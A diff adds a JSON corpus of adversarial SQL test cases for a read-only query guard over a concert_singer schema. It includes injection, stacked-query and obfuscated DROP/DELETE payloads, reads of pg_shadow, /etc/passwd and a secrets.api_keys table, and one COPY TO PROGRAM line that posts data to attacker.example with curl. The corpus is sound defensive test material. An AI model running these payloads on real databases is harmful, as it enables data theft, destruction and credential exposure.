@@ -1,0 +1,910 @@
+{
+ "schema": "spider_concert_singer",
+ "description": "Adversarial SQL corpus. Every 'block' case must be rejected by some layer; every 'allow' case must run.",
+ "cases": [
+  {
+   "id": "dml-01",
+   "category": "dml",
+   "expect": "block",
+   "sql": "INSERT INTO singer (singer_id, name) VALUES (99, 'mallory')"
+  },
+  {
+   "id": "dml-02",
+   "category": "dml",
+   "expect": "block",
+   "sql": "UPDATE singer SET age = 0"
+  },
+  {
+   "id": "dml-03",
+   "category": "dml",
+   "expect": "block",
+   "sql": "DELETE FROM singer"
+  },
+  {
+   "id": "dml-04",
+   "category": "dml",
+   "expect": "block",
+   "sql": "DELETE FROM singer WHERE singer_id = 1 RETURNING *"
+  },
+  {
+   "id": "dml-05",
+   "category": "dml",
+   "expect": "block",
+   "sql": "INSERT INTO singer SELECT * FROM singer"
+  },
+  {
+   "id": "dml-06",
+   "category": "dml",
+   "expect": "block",
+   "sql": "MERGE INTO singer s USING concert c ON s.singer_id = c.concert_id WHEN MATCHED THEN DELETE"
+  },
+  {
+   "id": "dml-07",
+   "category": "dml",
+   "expect": "block",
+   "sql": "UPSERT INTO singer VALUES (1)"
+  },
+  {
+   "id": "ddl-01",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "DROP TABLE singer"
+  },
+  {
+   "id": "ddl-02",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "DROP TABLE IF EXISTS singer CASCADE"
+  },
+  {
+   "id": "ddl-03",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "DROP SCHEMA spider_concert_singer CASCADE"
+  },
+  {
+   "id": "ddl-04",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "TRUNCATE singer"
+  },
+  {
+   "id": "ddl-05",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "ALTER TABLE singer ADD COLUMN pwned int"
+  },
+  {
+   "id": "ddl-06",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "ALTER TABLE singer RENAME TO singer_old"
+  },
+  {
+   "id": "ddl-07",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE TABLE stolen AS SELECT * FROM singer"
+  },
+  {
+   "id": "ddl-08",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE TEMP TABLE scratch (x int)"
+  },
+  {
+   "id": "ddl-09",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE INDEX idx ON singer (name)"
+  },
+  {
+   "id": "ddl-10",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE VIEW v AS SELECT * FROM singer"
+  },
+  {
+   "id": "ddl-11",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'"
+  },
+  {
+   "id": "ddl-12",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE EXTENSION dblink"
+  },
+  {
+   "id": "ddl-13",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "CREATE ROLE mallory SUPERUSER LOGIN PASSWORD 'x'"
+  },
+  {
+   "id": "ddl-14",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "COMMENT ON TABLE singer IS 'pwned'"
+  },
+  {
+   "id": "ddl-15",
+   "category": "ddl",
+   "expect": "block",
+   "sql": "REFRESH MATERIALIZED VIEW mv"
+  },
+  {
+   "id": "stacked_queries-01",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT 1; DROP TABLE singer"
+  },
+  {
+   "id": "stacked_queries-02",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT * FROM singer;DELETE FROM singer"
+  },
+  {
+   "id": "stacked_queries-03",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT 1;;DROP TABLE singer"
+  },
+  {
+   "id": "stacked_queries-04",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT 1 -- harmless\n; DROP TABLE singer"
+  },
+  {
+   "id": "stacked_queries-05",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT 1 /* ; */ ; TRUNCATE singer"
+  },
+  {
+   "id": "stacked_queries-06",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT ';' ; DROP TABLE singer"
+  },
+  {
+   "id": "stacked_queries-07",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "select 1\n;\nupdate singer set age = 1"
+  },
+  {
+   "id": "stacked_queries-08",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT name FROM singer WHERE name = '' OR 1=1; DROP TABLE singer; --'"
+  },
+  {
+   "id": "stacked_queries-09",
+   "category": "stacked_queries",
+   "expect": "block",
+   "sql": "SELECT 1; SELECT pg_sleep(30)"
+  },
+  {
+   "id": "hidden_writes-01",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "WITH d AS (DELETE FROM singer RETURNING *) SELECT * FROM d"
+  },
+  {
+   "id": "hidden_writes-02",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "WITH u AS (UPDATE singer SET age = 1 RETURNING 1) SELECT count(*) FROM u"
+  },
+  {
+   "id": "hidden_writes-03",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "WITH i AS (INSERT INTO singer (singer_id) VALUES (100) RETURNING 1) SELECT 1"
+  },
+  {
+   "id": "hidden_writes-04",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "SELECT * FROM (WITH d AS (DELETE FROM singer RETURNING *) SELECT * FROM d) x"
+  },
+  {
+   "id": "hidden_writes-05",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "SELECT * INTO stolen FROM singer"
+  },
+  {
+   "id": "hidden_writes-06",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "SELECT * FROM singer FOR UPDATE"
+  },
+  {
+   "id": "hidden_writes-07",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "SELECT * FROM singer FOR SHARE NOWAIT"
+  },
+  {
+   "id": "hidden_writes-08",
+   "category": "hidden_writes",
+   "expect": "block",
+   "sql": "SELECT name FROM singer WHERE singer_id IN (WITH d AS (DELETE FROM concert RETURNING stadium_id) SELECT stadium_id FROM d)"
+  },
+  {
+   "id": "session_and_admin-01",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "SET ROLE postgres"
+  },
+  {
+   "id": "session_and_admin-02",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "SET statement_timeout = 0"
+  },
+  {
+   "id": "session_and_admin-03",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "SET SESSION AUTHORIZATION postgres"
+  },
+  {
+   "id": "session_and_admin-04",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "RESET ALL"
+  },
+  {
+   "id": "session_and_admin-05",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "GRANT ALL ON singer TO PUBLIC"
+  },
+  {
+   "id": "session_and_admin-06",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "REVOKE SELECT ON singer FROM safesql_reader"
+  },
+  {
+   "id": "session_and_admin-07",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "BEGIN; DELETE FROM singer; COMMIT"
+  },
+  {
+   "id": "session_and_admin-08",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "COMMIT"
+  },
+  {
+   "id": "session_and_admin-09",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "DISCARD ALL"
+  },
+  {
+   "id": "session_and_admin-10",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "LOCK TABLE singer IN ACCESS EXCLUSIVE MODE"
+  },
+  {
+   "id": "session_and_admin-11",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "VACUUM FULL singer"
+  },
+  {
+   "id": "session_and_admin-12",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "ANALYZE singer"
+  },
+  {
+   "id": "session_and_admin-13",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "CHECKPOINT"
+  },
+  {
+   "id": "session_and_admin-14",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "REINDEX TABLE singer"
+  },
+  {
+   "id": "session_and_admin-15",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "ALTER SYSTEM SET log_statement = 'none'"
+  },
+  {
+   "id": "session_and_admin-16",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "LISTEN events"
+  },
+  {
+   "id": "session_and_admin-17",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "NOTIFY events, 'x'"
+  },
+  {
+   "id": "session_and_admin-18",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "PREPARE p AS DELETE FROM singer"
+  },
+  {
+   "id": "session_and_admin-19",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "EXECUTE p"
+  },
+  {
+   "id": "session_and_admin-20",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "CALL do_something()"
+  },
+  {
+   "id": "session_and_admin-21",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "DO $$ BEGIN DELETE FROM singer; END $$"
+  },
+  {
+   "id": "session_and_admin-22",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "SHOW ALL"
+  },
+  {
+   "id": "session_and_admin-23",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "EXPLAIN ANALYZE DELETE FROM singer"
+  },
+  {
+   "id": "session_and_admin-24",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "EXPLAIN SELECT * FROM singer"
+  },
+  {
+   "id": "session_and_admin-25",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "COPY singer TO '/tmp/singer.csv'"
+  },
+  {
+   "id": "session_and_admin-26",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "COPY singer TO PROGRAM 'curl -d @- https://attacker.example'"
+  },
+  {
+   "id": "session_and_admin-27",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "COPY (SELECT * FROM singer) TO STDOUT"
+  },
+  {
+   "id": "session_and_admin-28",
+   "category": "session_and_admin",
+   "expect": "block",
+   "sql": "SECURITY LABEL ON TABLE singer IS 'x'"
+  },
+  {
+   "id": "dangerous_functions-01",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_sleep(30)"
+  },
+  {
+   "id": "dangerous_functions-02",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_catalog.pg_sleep(30)"
+  },
+  {
+   "id": "dangerous_functions-03",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT PG_SLEEP(1)"
+  },
+  {
+   "id": "dangerous_functions-04",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT name FROM singer WHERE pg_sleep(1) IS NOT NULL"
+  },
+  {
+   "id": "dangerous_functions-05",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_sleep_for('10 seconds')"
+  },
+  {
+   "id": "dangerous_functions-06",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_read_file('/etc/passwd')"
+  },
+  {
+   "id": "dangerous_functions-07",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_ls_dir('.')"
+  },
+  {
+   "id": "dangerous_functions-08",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT lo_import('/etc/passwd')"
+  },
+  {
+   "id": "dangerous_functions-09",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT set_config('statement_timeout', '0', false)"
+  },
+  {
+   "id": "dangerous_functions-10",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT current_setting('data_directory')"
+  },
+  {
+   "id": "dangerous_functions-11",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT query_to_xml('DELETE FROM singer RETURNING *', true, true, '')"
+  },
+  {
+   "id": "dangerous_functions-12",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT dblink_exec('dbname=safesql', 'DROP TABLE singer')"
+  },
+  {
+   "id": "dangerous_functions-13",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT * FROM dblink('dbname=postgres', 'SELECT 1') AS t(x int)"
+  },
+  {
+   "id": "dangerous_functions-14",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_terminate_backend(1)"
+  },
+  {
+   "id": "dangerous_functions-15",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT nextval('some_seq')"
+  },
+  {
+   "id": "dangerous_functions-16",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT version()"
+  },
+  {
+   "id": "dangerous_functions-17",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT current_user"
+  },
+  {
+   "id": "dangerous_functions-18",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_advisory_lock(42)"
+  },
+  {
+   "id": "dangerous_functions-19",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT txid_current()"
+  },
+  {
+   "id": "dangerous_functions-20",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT pg_notify('channel', 'payload')"
+  },
+  {
+   "id": "dangerous_functions-21",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT inet_server_addr()"
+  },
+  {
+   "id": "dangerous_functions-22",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT my_udf(1)"
+  },
+  {
+   "id": "dangerous_functions-23",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT public.evil()"
+  },
+  {
+   "id": "dangerous_functions-24",
+   "category": "dangerous_functions",
+   "expect": "block",
+   "sql": "SELECT repeat('x', 100000000)"
+  },
+  {
+   "id": "catalog_recon-01",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM pg_catalog.pg_user"
+  },
+  {
+   "id": "catalog_recon-02",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT usename, passwd FROM pg_shadow"
+  },
+  {
+   "id": "catalog_recon-03",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT rolname, rolpassword FROM pg_authid"
+  },
+  {
+   "id": "catalog_recon-04",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM pg_user"
+  },
+  {
+   "id": "catalog_recon-05",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM PG_CATALOG.PG_USER"
+  },
+  {
+   "id": "catalog_recon-06",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM \"pg_catalog\".\"pg_authid\""
+  },
+  {
+   "id": "catalog_recon-07",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM information_schema.tables"
+  },
+  {
+   "id": "catalog_recon-08",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT table_name, column_name FROM information_schema.columns"
+  },
+  {
+   "id": "catalog_recon-09",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM pg_stat_activity"
+  },
+  {
+   "id": "catalog_recon-10",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT name, setting FROM pg_settings"
+  },
+  {
+   "id": "catalog_recon-11",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM pg_roles"
+  },
+  {
+   "id": "catalog_recon-12",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT nspname FROM pg_namespace"
+  },
+  {
+   "id": "catalog_recon-13",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT name, country FROM singer UNION SELECT usename, passwd FROM pg_shadow"
+  },
+  {
+   "id": "catalog_recon-14",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT name FROM singer WHERE name IN (SELECT rolname FROM pg_roles)"
+  },
+  {
+   "id": "catalog_recon-15",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT * FROM (WITH pg_user AS (SELECT 1 AS a) SELECT * FROM pg_user) a, pg_user b"
+  },
+  {
+   "id": "catalog_recon-16",
+   "category": "catalog_recon",
+   "expect": "block",
+   "sql": "SELECT (SELECT count(*) FROM pg_class) AS n"
+  },
+  {
+   "id": "cross_schema-01",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT * FROM secrets.api_keys"
+  },
+  {
+   "id": "cross_schema-02",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT api_key FROM secrets.api_keys WHERE service = 'payments'"
+  },
+  {
+   "id": "cross_schema-03",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT s.name, k.api_key FROM singer s JOIN secrets.api_keys k ON true"
+  },
+  {
+   "id": "cross_schema-04",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT (SELECT api_key FROM secrets.api_keys LIMIT 1) AS k"
+  },
+  {
+   "id": "cross_schema-05",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "WITH x AS (SELECT * FROM secrets.api_keys) SELECT * FROM x"
+  },
+  {
+   "id": "cross_schema-06",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT * FROM inject_demo.products"
+  },
+  {
+   "id": "cross_schema-07",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT * FROM spider_world_1.city"
+  },
+  {
+   "id": "cross_schema-08",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT * FROM public.anything"
+  },
+  {
+   "id": "cross_schema-09",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT * FROM safesql.secrets.api_keys"
+  },
+  {
+   "id": "cross_schema-10",
+   "category": "cross_schema",
+   "expect": "block",
+   "sql": "SELECT name FROM singer UNION ALL SELECT api_key FROM secrets.api_keys"
+  },
+  {
+   "id": "resource_exhaustion-01",
+   "category": "resource_exhaustion",
+   "expect": "block",
+   "sql": "SELECT count(*) FROM generate_series(1, 10000000000)"
+  },
+  {
+   "id": "resource_exhaustion-02",
+   "category": "resource_exhaustion",
+   "expect": "block",
+   "sql": "SELECT count(*) FROM singer a, singer b, singer c, singer d, singer e, singer f, singer g, singer h, singer i, singer j, singer k"
+  },
+  {
+   "id": "resource_exhaustion-03",
+   "category": "resource_exhaustion",
+   "expect": "block",
+   "sql": "SELECT count(*) FROM concert a CROSS JOIN concert b CROSS JOIN concert c CROSS JOIN concert d CROSS JOIN concert e CROSS JOIN concert f CROSS JOIN concert g CROSS JOIN concert h CROSS JOIN concert i CROSS JOIN concert j"
+  },
+  {
+   "id": "resource_exhaustion-04",
+   "category": "resource_exhaustion",
+   "expect": "block",
+   "sql": "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT count(*) FROM r"
+  },
+  {
+   "id": "resource_exhaustion-05",
+   "category": "resource_exhaustion",
+   "expect": "block",
+   "sql": "SELECT string_agg(md5(g::text), '') FROM generate_series(1, 50000000) g"
+  },
+  {
+   "id": "obfuscation-01",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "dElEtE FROM singer"
+  },
+  {
+   "id": "obfuscation-02",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "DROP/**/TABLE/**/singer"
+  },
+  {
+   "id": "obfuscation-03",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "SELECT/**/1;/**/DROP/**/TABLE/**/singer"
+  },
+  {
+   "id": "obfuscation-04",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "DR/**/OP TABLE singer"
+  },
+  {
+   "id": "obfuscation-05",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "SELECT 1; ＤＲＯＰ TABLE singer"
+  },
+  {
+   "id": "obfuscation-06",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "\nDELETE\nFROM\nsinger\n"
+  },
+  {
+   "id": "obfuscation-07",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "(DELETE FROM singer)"
+  },
+  {
+   "id": "obfuscation-08",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "SELECT * FROM singer WHERE singer_id = 1 UNION SELECT NULL, rolname, NULL, NULL, NULL, NULL, NULL FROM pg_roles--"
+  },
+  {
+   "id": "obfuscation-09",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "SELECT 1 WHERE 1 = 1 UNION ALL (SELECT 1 FROM pg_sleep(5))"
+  },
+  {
+   "id": "obfuscation-10",
+   "category": "obfuscation",
+   "expect": "block",
+   "sql": "\"pg_sleep\"(5)"
+  },
+  {
+   "id": "tricky_benign-01",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT 'DROP TABLE singer' AS s",
+   "why": "keywords inside a string literal"
+  },
+  {
+   "id": "tricky_benign-02",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name FROM singer WHERE name = '; DELETE FROM singer; --'",
+   "why": "SQLi payload as a literal value"
+  },
+  {
+   "id": "tricky_benign-03",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT $$;DROP TABLE singer$$ AS s",
+   "why": "dollar-quoted string"
+  },
+  {
+   "id": "tricky_benign-04",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT count(*) FROM singer -- DROP TABLE singer",
+   "why": "write keyword inside a trailing comment"
+  },
+  {
+   "id": "tricky_benign-05",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT 'pg_sleep(10)' AS f",
+   "why": "function name inside a string"
+  },
+  {
+   "id": "tricky_benign-06",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name AS \"delete\", age AS \"drop\" FROM singer",
+   "why": "keywords as quoted aliases"
+  },
+  {
+   "id": "tricky_benign-07",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name FROM singer WHERE name = '' OR '1' = '1'",
+   "why": "tautology over allowed data is still read-only"
+  },
+  {
+   "id": "tricky_benign-08",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "WITH s AS (SELECT * FROM singer) SELECT count(*) FROM s",
+   "why": "plain CTE"
+  },
+  {
+   "id": "tricky_benign-09",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 10) SELECT sum(n) FROM r",
+   "why": "bounded recursion"
+  },
+  {
+   "id": "tricky_benign-10",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name, rank() OVER (ORDER BY age DESC) FROM singer",
+   "why": "window function"
+  },
+  {
+   "id": "tricky_benign-11",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT * FROM generate_series(1, 5) g",
+   "why": "small table function"
+  },
+  {
+   "id": "tricky_benign-12",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "(SELECT name FROM singer ORDER BY age LIMIT 3)",
+   "why": "parenthesised query"
+  },
+  {
+   "id": "tricky_benign-13",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name FROM singer FETCH FIRST 2 ROWS ONLY",
+   "why": "FETCH FIRST"
+  },
+  {
+   "id": "tricky_benign-14",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT name FROM singer UNION SELECT name FROM stadium ORDER BY 1 LIMIT 5",
+   "why": "set operation with limit"
+  },
+  {
+   "id": "tricky_benign-15",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT s.name FROM spider_concert_singer.singer s",
+   "why": "schema-qualified allowed table"
+  },
+  {
+   "id": "tricky_benign-16",
+   "category": "tricky_benign",
+   "expect": "allow",
+   "sql": "SELECT \"Name\" FROM (SELECT name AS \"Name\" FROM singer) t",
+   "why": "quoted mixed-case alias"
+  }
+ ]
+}
